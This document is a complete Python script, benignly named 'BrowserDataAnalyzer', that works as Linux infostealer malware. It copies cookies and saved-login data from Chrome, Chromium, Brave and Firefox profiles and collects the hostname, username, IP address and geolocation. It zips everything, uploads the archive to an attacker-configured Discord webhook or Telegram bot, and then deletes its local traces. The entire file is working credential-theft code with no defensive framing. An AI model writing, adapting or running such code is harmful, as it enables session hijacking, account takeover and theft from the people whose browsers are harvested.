#!/usr/bin/env python3

import os
import json
import sqlite3
import platform
import datetime
import hashlib
from pathlib import Path
from base64 import b64encode, b64decode
import logging
import uuid
from urllib.parse import urlparse
import subprocess
import shutil
import tempfile
import glob
import browser_cookie3
import secretstorage
import json
from Crypto.Cipher import AES
import configparser
from getpass import getpass
import requests
import zipfile
from datetime import datetime
import time

DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
AVATAR_URL = "YOUR_AVATAR_URL"

class BrowserDataAnalyzer:
    def __init__(self):
        self.setup_logging()
        self.system = platform.system()
        self.session_id = str(uuid.uuid4())[:8]
        self.output_dir = self.create_output_directories()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)

    def create_output_directories(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_dir = f'browser_data_{timestamp}_{self.session_id}'
        os.makedirs(base_dir, exist_ok=True)
        os.makedirs(os.path.join(base_dir, 'cookies'), exist_ok=True)
        os.makedirs(os.path.join(base_dir, 'passwords'), exist_ok=True)
        return base_dir

    def zip_results(self):
        zip_path = f"{self.output_dir}.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(self.output_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, self.output_dir)
                    zipf.write(file_path, arcname)
        return zip_path

    def get_system_info(self):
        try:
            if platform.system() == "Linux":
                cpu_info = "Unknown"
                try:
                    with open('/proc/cpuinfo', 'r') as f:
                        for line in f:
                            if 'model name' in line:
                                cpu_info = line.split(':')[1].strip()
                                break
                except:
                    pass
            else:
                cpu_info = platform.processor()

            memory_info = "Unknown"
            if platform.system() == "Linux":
                try:
                    with open('/proc/meminfo', 'r') as f:
                        total = 0
                        for line in f:
                            if 'MemTotal' in line:
                                total = int(line.split()[1]) // 1024
                                memory_info = f"{total // 1024:.1f} GB"
                                break
                except:
                    pass

            disk_info = "Unknown"
            try:
                total, used, free = shutil.disk_usage('/')
                disk_info = f"Total: {total // (2**30):.1f} GB, Used: {used // (2**30):.1f} GB, Free: {free // (2**30):.1f} GB"
            except:
                pass

            return {
                "OS": f"{platform.system()} {platform.release()}",
                "Architecture": platform.machine(),
                "Processor": cpu_info,
                "Memory": memory_info,
                "Disk": disk_info,
                "Hostname": platform.node(),
                "Username": os.getlogin(),
                "Python Version": platform.python_version(),
                "System Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        except Exception as e:
            self.logger.error(f"Error getting system info: {str(e)}")
            return {}

    def check_discord_api(self):
        try:
            response = requests.get(DISCORD_WEBHOOK_URL)
            return response.status_code == 200
        except:
            return False

    def check_telegram_api(self):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
            response = requests.get(url)
            return response.status_code == 200
        except:
            return False

    def upload_to_telegram(self, file_path):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
            with open(file_path, 'rb') as f:
                files = {
                    'document': f
                }
                data = {
                    'chat_id': TELEGRAM_CHAT_ID,
                    'caption': "🔒 Data Collection Complete!"
                }
                response = requests.post(url, files=files, data=data)
                
                if response.status_code == 200:
                    self.logger.info("Successfully sent file through Telegram")
                    return True
                else:
                    self.logger.error(f"Failed to send file through Telegram: {response.status_code}")
                    return False
                    
        except Exception as e:
            self.logger.error(f"Error uploading to Telegram: {str(e)}")
            return False

    def send_to_discord(self, zip_path):
        try:
            system_info = self.get_system_info()
            
            try:
                ip_response = requests.get('https://ipinfo.io/json')
                if ip_response.status_code == 200:
                    ip_info = ip_response.json()
                else:
                    ip_info = {}
            except Exception as e:
                self.logger.error(f"Error getting IP info: {str(e)}")
                ip_info = {}
                
            info_message = "\n".join([
                "```ansi",
                "\u001b[1;35m               [ System Information ]\u001b[0m",
                "",
                f"\u001b[0;90m══════════════════════════════════════════════\u001b[0m",
                "",
                f"\u001b[1;36m   System   \u001b[0m \u001b[0;97m→\u001b[0m  \u001b[1;32m{system_info.get('OS', 'Unknown')}\u001b[0m",
                f"\u001b[1;36m   CPU      \u001b[0m \u001b[0;97m→\u001b[0m  \u001b[1;32m{system_info.get('Processor', 'Unknown')}\u001b[0m",
                f"\u001b[1;36m   Memory   \u001b[0m \u001b[0;97m→\u001b[0m  \u001b[1;32m{system_info.get('Memory', 'Unknown')}\u001b[0m",
                f"\u001b[1;36m   Storage  \u001b[0m \u001b[0;97m→\u001b[0m  \u001b[1;32m{system_info.get('Disk', 'Unknown')}\u001b[0m",
                f"\u001b[1;36m   Host     \u001b[0m \u001b[0;97m→\u001b[0m  \u001b[1;32m{system_info.get('Hostname', 'Unknown')}\u001b[0m",
                f"\u001b[1;36m   User     \u001b[0m \u001b[0;97m→\u001b[0m  \u001b[1;32m{system_info.get('Username', 'Unknown')}\u001b[0m",
                "",
                f"\u001b[0;90m══════════════════════════════════════════════\u001b[0m",
                "",
                "\u001b[1;35m               [ Network Details ]\u001b[0m",
                "",
                f"\u001b[1;36m   IP       \u001b[0m \u001b[0;97m→\u001b[0m  \u001b[1;32m{ip_info.get('ip', 'Unknown')}\u001b[0m",
                f"\u001b[1;36m   Location \u001b[0m \u001b[0;97m→\u001b[0m  \u001b[1;32m{ip_info.get('city', 'Unknown')}, {ip_info.get('region', 'Unknown')}\u001b[0m",
                f"\u001b[1;36m   Country  \u001b[0m \u001b[0;97m→\u001b[0m  \u001b[1;32m{ip_info.get('country', 'Unknown')}\u001b[0m",
                f"\u001b[1;36m   ISP      \u001b[0m \u001b[0;97m→\u001b[0m  \u001b[1;32m{ip_info.get('org', 'Unknown')}\u001b[0m",
                f"\u001b[1;36m   Coords   \u001b[0m \u001b[0;97m→\u001b[0m  \u001b[1;32m{ip_info.get('loc', 'Unknown')}\u001b[0m",
                "",
                f"\u001b[0;90m══════════════════════════════════════════════\u001b[0m",
                "```"
            ])

            discord_available = self.check_discord_api()
            telegram_available = self.check_telegram_api()

            if discord_available:
                message = {
                    "username": "SAMAR",
                    "avatar_url": AVATAR_URL,
                    "content": info_message
                }
                requests.post(DISCORD_WEBHOOK_URL, json=message)
                time.sleep(3)

            file_size = os.path.getsize(zip_path)
            upload_success = False

            if discord_available and file_size < 8 * 1024 * 1024:
                with open(zip_path, 'rb') as f:
                    files = {
                        'file': (os.path.basename(zip_path), f, 'application/zip')
                    }
                    payload = {
                        "username": "SAMAR",
                        "avatar_url": AVATAR_URL,
                        "content": "```ansi\n\u001b[1;32m[✓] Data Collection Complete!\u001b[0m```"
                    }
                    response = requests.post(
                        DISCORD_WEBHOOK_URL,
                        files=files,
                        data=payload
                    )
                    
                    if response.status_code == 200:
                        self.logger.info("Successfully sent results to Discord")
                        upload_success = True
                    else:
                        self.logger.error(f"Failed to send results to Discord: {response.status_code}")

            if not upload_success and telegram_available:
                self.logger.info("Trying Telegram upload...")
                if self.upload_to_telegram(zip_path):
                    upload_success = True

            if not upload_success:
                self.logger.error("Failed to upload file through all available methods")
                
        except Exception as e:
            self.logger.error(f"Error sending results: {str(e)}")

    def create_browser_directory(self, browser_name, data_type):
        browser_dir = os.path.join(self.output_dir, data_type, browser_name.lower().replace(' ', '_'))
        os.makedirs(browser_dir, exist_ok=True)
        return browser_dir

    def get_domain_from_host(self, host):
        if not host:
            return "unknown_domain"
        
        host = host.lstrip('.')
        
        if host == "localhost" or host.replace('.', '').isdigit():
            return host
            
        try:
            parsed = urlparse(f"http://{host}")
            domain = parsed.netloc if parsed.netloc else host
            return domain.lower()
        except Exception:
            return host.lower()

    def format_cookie(self, domain, name, value, path, expires, secure=True, http_only=True, same_site="no_restriction"):
        return {
            "domain": domain,
            "expirationDate": float(expires) if expires else None,
            "hostOnly": not domain.startswith('.'),
            "httpOnly": http_only,
            "name": name,
            "path": path or "/",
            "sameSite": same_site,
            "secure": secure,
            "session": not expires,
            "storeId": None,
            "value": value
        }

    def format_password(self, url, username, password, browser):
        return {
            "url": url,
            "username": username,
            "password": password,
            "browser": browser
        }

    def get_browser_paths(self):
        if self.system == "Linux":
            return {
                'chrome': {
                    'name': 'Google Chrome',
                    'paths': {
                        'cookies': [
                            '~/.config/google-chrome/Default/Cookies',
                            '~/.config/google-chrome/Profile */Cookies'
                        ],
                        'passwords': [
                            '~/.config/google-chrome/Default/Login Data',
                            '~/.config/google-chrome/Profile */Login Data'
                        ]
                    }
                },
                'chromium': {
                    'name': 'Chromium',
                    'paths': {
                        'cookies': [
                            '~/.config/chromium/Default/Cookies',
                            '~/.config/chromium/Profile */Cookies'
                        ],
                        'passwords': [
                            '~/.config/chromium/Default/Login Data',
                            '~/.config/chromium/Profile */Login Data'
                        ]
                    }
                },
                'brave': {
                    'name': 'Brave',
                    'paths': {
                        'cookies': [
                            '~/.config/BraveSoftware/Brave-Browser/Default/Cookies',
                            '~/.config/BraveSoftware/Brave-Browser/Profile */Cookies'
                        ],
                        'passwords': [
                            '~/.config/BraveSoftware/Brave-Browser/Default/Login Data',
                            '~/.config/BraveSoftware/Brave-Browser/Profile */Login Data'
                        ]
                    }
                },
                'firefox': {
                    'name': 'Firefox',
                    'paths': {
                        'cookies': ['~/.mozilla/firefox/*.default*/cookies.sqlite'],
                        'passwords': ['~/.mozilla/firefox/*.default*/logins.json']
                    }
                }
            }
        else:
            self.logger.warning(f"Unsupported operating system: {self.system}")
            return {}

    def find_files(self, paths):
        found_paths = []
        for path_pattern in paths:
            expanded_path = os.path.expanduser(path_pattern)
            if '*' in expanded_path:
                found_paths.extend(glob.glob(expanded_path))
            else:
                if os.path.exists(expanded_path):
                    found_paths.append(expanded_path)
        return found_paths

    def get_firefox_passwords(self, profile_path):
        passwords = []
        try:
            logins_path = os.path.join(profile_path, 'logins.json')
            if not os.path.exists(logins_path):
                return passwords

            key4_path = os.path.join(profile_path, 'key4.db')
            if not os.path.exists(key4_path):
                return passwords

            with open(logins_path, 'r') as f:
                login_data = json.load(f)

            for login in login_data.get('logins', []):
                try:
                    passwords.append(self.format_password(
                        url=login.get('hostname', ''),
                        username=login.get('encryptedUsername', ''),
                        password=login.get('encryptedPassword', ''),
                        browser='firefox'
                    ))
                except Exception as e:
                    self.logger.error(f"Error processing Firefox password: {str(e)}")

        except Exception as e:
            self.logger.error(f"Error extracting Firefox passwords: {str(e)}")

        return passwords

    def get_chrome_based_passwords(self, browser_name, login_data_path):
        passwords = []
        try:
            if not os.path.exists(login_data_path):
                return passwords

            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                temp_path = temp_file.name
                shutil.copy2(login_data_path, temp_path)

            try:
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                for row in cursor.fetchall():
                    url, username, encrypted_password = row
                    try:
                        passwords.append(self.format_password(
                            url=url,
                            username=username,
                            password=b64encode(encrypted_password).decode('utf-8'),
                            browser=browser_name.lower()
                        ))
                    except Exception as e:
                        self.logger.error(f"Error processing {browser_name} password: {str(e)}")

                conn.close()

            except Exception as e:
                self.logger.error(f"Error reading {browser_name} passwords: {str(e)}")

            try:
                os.unlink(temp_path)
            except:
                pass

        except Exception as e:
            self.logger.error(f"Error extracting {browser_name} passwords: {str(e)}")

        return passwords

    def extract_chromium_based_cookies(self, cookie_path, browser_name):
        cookies_by_domain = {}
        try:
            if not os.path.exists(cookie_path):
                self.logger.warning(f"{browser_name} cookies database not found at: {cookie_path}")
                return cookies_by_domain

            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                temp_path = temp_file.name
                shutil.copy2(cookie_path, temp_path)

            try:
                browser_type = None
                if 'brave' in browser_name.lower():
                    browser_type = browser_cookie3.brave
                elif 'chrome' in browser_name.lower():
                    browser_type = browser_cookie3.chrome
                elif 'chromium' in browser_name.lower():
                    browser_type = browser_cookie3.chromium
                
                if browser_type is None:
                    self.logger.error(f"Unsupported browser type: {browser_name}")
                    return cookies_by_domain

                try:
                    cj = browser_type()
                    for cookie in cj:
                        domain = self.get_domain_from_host(cookie.domain)
                        
                        cookie_dict = self.format_cookie(
                            domain=cookie.domain,
                            name=cookie.name,
                            value=cookie.value,
                            path=cookie.path,
                            expires=cookie.expires,
                            secure=cookie.secure,
                            http_only=cookie.has_nonstandard_attr('HttpOnly'),
                            same_site=cookie.get_nonstandard_attr('SameSite', 'no_restriction')
                        )
                        
                        if domain not in cookies_by_domain:
                            cookies_by_domain[domain] = []
                        cookies_by_domain[domain].append(cookie_dict)
                except Exception as e:
                    self.logger.error(f"Error getting cookies for {browser_name}: {str(e)}")
                
            except Exception as e:
                self.logger.error(f"Error decrypting {browser_name} cookies: {str(e)}")
            
            try:
                os.unlink(temp_path)
            except:
                pass

        except Exception as e:
            self.logger.error(f"Error extracting {browser_name} cookies: {str(e)}")

        return cookies_by_domain

    def get_firefox_cookies(self):
        cookies_by_domain = {}
        browser_paths = self.get_browser_paths().get('firefox', {}).get('paths', {}).get('cookies', [])
        
        for path_pattern in browser_paths:
            found_paths = self.find_files([path_pattern])
            
            for cookie_path in found_paths:
                try:
                    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                        temp_path = temp_file.name
                        shutil.copy2(cookie_path, temp_path)

                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    
                    try:
                        cursor.execute('''
                            SELECT host, name, value, path, expiry, 
                                   isSecure, isHttpOnly, sameSite
                            FROM moz_cookies
                        ''')
                        
                        for row in cursor.fetchall():
                            host, name, value, path, expiry, is_secure, is_httponly, samesite = row
                            domain = self.get_domain_from_host(host)
                            
                            samesite_map = {0: "no_restriction", 1: "lax", 2: "strict"}
                            samesite = samesite_map.get(samesite, "no_restriction")
                            
                            cookie = self.format_cookie(
                                domain=f".{domain}" if not domain.startswith('.') else domain,
                                name=name,
                                value=value,
                                path=path or "/",
                                expires=expiry,
                                secure=bool(is_secure),
                                http_only=bool(is_httponly),
                                same_site=samesite
                            )
                            
                            if domain not in cookies_by_domain:
                                cookies_by_domain[domain] = []
                            cookies_by_domain[domain].append(cookie)
                            
                    except sqlite3.OperationalError as e:
                        self.logger.error(f"Error reading Firefox cookies: {str(e)}")

                    conn.close()
                    os.unlink(temp_path)

                except Exception as e:
                    self.logger.error(f"Error extracting Firefox cookies from {cookie_path}: {str(e)}")

        return cookies_by_domain

    def save_data_by_domain(self, browser_name, data, data_type):
        browser_dir = self.create_browser_directory(browser_name, data_type)
        
        if data_type == 'cookies':
            for domain, items in data.items():
                safe_domain = "".join(c if c.isalnum() else "_" for c in domain)
                file_path = os.path.join(browser_dir, f"{safe_domain}_cookies.json")
                try:
                    with open(file_path, 'w') as f:
                        json.dump(items, f, indent=4)
                    self.logger.info(f"Saved {len(items)} cookies for {domain} in {browser_name}")
                except Exception as e:
                    self.logger.error(f"Error saving cookies for {domain} in {browser_name}: {str(e)}")
        else:
            file_path = os.path.join(browser_dir, "passwords.json")
            try:
                with open(file_path, 'w') as f:
                    json.dump(data, f, indent=4)
                self.logger.info(f"Saved {len(data)} passwords for {browser_name}")
            except Exception as e:
                self.logger.error(f"Error saving passwords for {browser_name}: {str(e)}")

    def extract_browser_data(self):
        browser_paths = self.get_browser_paths()
        browsers_found = []

        for browser_type, browser_info in browser_paths.items():
            self.logger.info(f"Checking for {browser_info['name']} browser...")
            
            if browser_type == 'firefox':
                cookies_by_domain = self.get_firefox_cookies()
                if cookies_by_domain:
                    self.logger.info(f"Found Firefox with {sum(len(c) for c in cookies_by_domain.values())} cookies")
                    self.save_data_by_domain('firefox', cookies_by_domain, 'cookies')
                    browsers_found.append('firefox')
                
                for profile_path in self.find_files(browser_info['paths']['passwords']):
                    passwords = self.get_firefox_passwords(os.path.dirname(profile_path))
                    if passwords:
                        self.save_data_by_domain('firefox', passwords, 'passwords')
            else:
                found_cookie_paths = self.find_files(browser_info['paths']['cookies'])
                if found_cookie_paths:
                    all_cookies_by_domain = {}
                    for cookie_path in found_cookie_paths:
                        cookies_by_domain = self.extract_chromium_based_cookies(
                            cookie_path, 
                            browser_info['name']
                        )
                        for domain, cookies in cookies_by_domain.items():
                            if domain not in all_cookies_by_domain:
                                all_cookies_by_domain[domain] = []
                            all_cookies_by_domain[domain].extend(cookies)
                    
                    if all_cookies_by_domain:
                        self.logger.info(f"Found {browser_info['name']} with {sum(len(c) for c in all_cookies_by_domain.values())} cookies")
                        self.save_data_by_domain(browser_info['name'], all_cookies_by_domain, 'cookies')
                        browsers_found.append(browser_info['name'])
                
                all_passwords = []
                for password_path in self.find_files(browser_info['paths']['passwords']):
                    passwords = self.get_chrome_based_passwords(browser_info['name'], password_path)
                    all_passwords.extend(passwords)
                
                if all_passwords:
                    self.save_data_by_domain(browser_info['name'], all_passwords, 'passwords')

        return browsers_found

def main():
    analyzer = BrowserDataAnalyzer()
    browsers_found = analyzer.extract_browser_data()
    
    if browsers_found:
        analyzer.logger.info(f"Analysis complete. Found browsers: {', '.join(browsers_found)}")
        analyzer.logger.info(f"Results saved in directory: {analyzer.output_dir}")
        
        zip_path = analyzer.zip_results()
        analyzer.send_to_discord(zip_path)
        
        try:
            os.remove(zip_path)
            shutil.rmtree(analyzer.output_dir)
            analyzer.logger.info("Cleaned up temporary files")
        except Exception as e:
            analyzer.logger.error(f"Error cleaning up: {str(e)}")
    else:
        analyzer.logger.warning("No supported browsers found with accessible data")

if __name__ == "__main__":
    main() 